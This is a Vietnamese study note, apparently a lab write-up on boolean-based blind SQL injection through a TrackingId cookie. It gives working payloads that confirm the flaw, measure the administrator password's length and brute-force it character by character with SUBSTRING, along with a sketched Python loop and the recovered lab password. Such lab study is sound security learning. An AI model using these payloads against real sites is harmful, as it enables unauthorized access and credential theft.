![[lab-blind-boolean.png]]
Lab blind boolean qua TrackingId cookie, brute SUBSTRING password administrator.

> [!NOTE] phân tích đề
> - TrackingId dính SQLi nhưng không in data.
> - chỉ khác nhau chữ Welcome back!.
> -sau khi quan sát 2 gói tin TrackingId `' AND '1'='1` vs `'1'='2` này, mình thấy đúng thì response có chữ Welcome back còn sai thì mất, nên mình hỏi DB từng ký tự true/false để brute password.
> - liên quan [[Blind sql injection]] và [[payload giúp brute force mật khẩu cho blind && error-sql]].

### hướng giải
- [ ] lấy TrackingId gốc + session.
- [ ] test `' AND '1'='1` vs `' AND '1'='2`.
- [ ] đo length password.
- [ ] brute từng vị trí bằng SUBSTRING.
- [ ] login administrator.

### giải
request gốc:
```
GET / HTTP/1.1
Cookie: TrackingId=xyz123; session=aaa
```
-> response có `Welcome back!`.

request true:
```
Cookie: TrackingId=xyz123' AND '1'='1
```
-> vẫn có `Welcome back!`.
request false:
```
Cookie: TrackingId=xyz123' AND '1'='2
```
-> mất `Welcome back!`.
=> confirm blind boolean.

request đo length:
```
Cookie: TrackingId=xyz123' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')>1--
```
-> true thì Welcome.
-> tăng dần tới `>20` thì false.
=> length = 20.

request brute ký tự 1:
```
Cookie: TrackingId=xyz123' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--
```
-> có Welcome là trúng.
-> không có thì thử `b`, `c`...
=> mình chạy Intruder hoặc script python.

lệnh script mình hay dùng:
```bash
python3 blind_brute.py
# payload trong loop:
# f"{tracking}' AND (SELECT SUBSTRING(password,{pos},1) FROM users WHERE username='administrator')='{c}'--"
# check "Welcome back!" in response.text
```
kết quả mình lụm được:
```
administrator : 5t8k2m9x4p7q1w6z3r0v
```
-> login thành công.
=> solved.

> [!NOTE] bài học
> - blind boolean = hỏi đúng / sai.
> - SUBSTRING index từ 1.
> - brute tay 1-2 ký tự rồi auto cho lẹ.
> - sau bài này qua [[Lab-Blind time delays]].
